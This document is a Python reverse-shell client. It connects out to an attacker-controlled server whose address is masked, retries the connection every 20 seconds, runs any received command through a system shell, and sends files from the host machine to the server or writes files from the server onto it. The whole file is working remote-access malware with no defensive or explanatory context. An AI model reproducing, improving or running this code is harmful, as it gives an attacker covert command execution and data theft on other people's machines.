import socket
import time
import subprocess
import json
import os

# Configuration
SERVER_IP = 'XXXXXXXXXXX'
SERVER_PORT = XXXX

def reliable_send(socket, data):
    """
    Send data over the socket reliably.
    """
    jsondata = json.dumps(data)
    socket.send(jsondata.encode())

def reliable_recv(socket):
    """
    Receive data from the socket reliably.
    """
    data = ''
    while True:
        try:
            data += socket.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connect():
    """
    Connect to the server and establish a connection.
    """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            shell(s)
            s.close()
            break
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(20)

def upload_file(socket, file_name):
    """
    Upload a file to the server.
    """
    with open(file_name, 'rb') as f:
        socket.send(f.read())

def download_file(socket, file_name):
    """
    Download a file from the server.
    """
    with open(file_name, 'wb') as f:
        socket.settimeout(1)
        chunk = socket.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = socket.recv(1024)
            except socket.timeout:
                break
        socket.settimeout(None)

def shell(socket):
    """
    Handle shell commands from the server.
    """
    while True:
        command = reliable_recv(socket)
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command.startswith('cd '):
            os.chdir(command[3:])
        elif command.startswith('download'):
            upload_file(socket, command[9:])
        elif command.startswith('upload'):
            download_file(socket, command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(socket, result)

if __name__ == "__main__":
    connect()
